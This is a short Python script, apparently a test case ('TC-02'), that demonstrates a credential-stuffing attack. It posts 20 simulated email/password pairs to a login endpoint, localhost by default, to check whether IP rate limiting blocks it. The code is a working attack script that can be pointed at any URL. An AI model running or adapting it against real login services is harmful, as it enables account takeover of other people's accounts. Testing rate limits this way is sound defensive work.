"""
TC-02 — Credential Stuffing Attack Demo
Replays leaked user:pass pairs across many different accounts from a single IP.
Each account is tried only once (so per-account lockout alone won't stop this).
"""
import requests
import time
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:4000/login"

# Simulated breach database — 20 user:pass pairs (all wrong passwords)
COMBOS = [
    ("alice@mail.com",   "hunter2"),
    ("bob@mail.com",     "monkey"),
    ("carol@mail.com",   "iloveyou"),
    ("dave@mail.com",    "sunshine"),
    ("eve@mail.com",     "princess"),
    ("frank@mail.com",   "password1"),
    ("grace@mail.com",   "dragon"),
    ("hank@mail.com",    "master"),
    ("ivan@mail.com",    "shadow"),
    ("judy@mail.com",    "michael"),
    ("karl@mail.com",    "football"),
    ("lisa@mail.com",    "superman"),
    ("mike@mail.com",    "batman"),
    ("nina@mail.com",    "trustno1"),
    ("oscar@mail.com",   "hello"),
    ("pat@mail.com",     "charlie"),
    ("quinn@mail.com",   "donald"),
    ("rose@mail.com",    "letmein"),
    ("sam@mail.com",     "whatever"),
    ("tina@mail.com",    "666666"),
]

print(f"\n{'='*60}")
print(f"  CREDENTIAL STUFFING — target: {TARGET}")
print(f"  Pairs: {len(COMBOS)}  |  Each account tried ONCE (different users, 1 IP)")
print(f"{'='*60}\n")

for i, (user, pwd) in enumerate(COMBOS, 1):
    try:
        r = requests.post(TARGET, json={"username": user, "password": pwd}, timeout=5)
        label = "BLOCKED" if r.status_code == 429 else ("HIT" if r.status_code == 200 else "miss")
        print(f"[{i:02d}] {user:25s}  status={r.status_code}  [{label}]")
        if r.status_code == 429:
            print(f"\n>>> IP rate-limit triggered at request {i}. All subsequent attempts blocked.")
            print(f"    Backend only saw the first {i-1} request(s).")
            break
        if r.status_code == 200:
            print(f"\n>>> VALID CREDENTIALS FOUND for {user}!")
    except requests.exceptions.ConnectionError:
        print(f"[{i:02d}] Connection refused — is {TARGET} running?")
        break
    time.sleep(0.05)
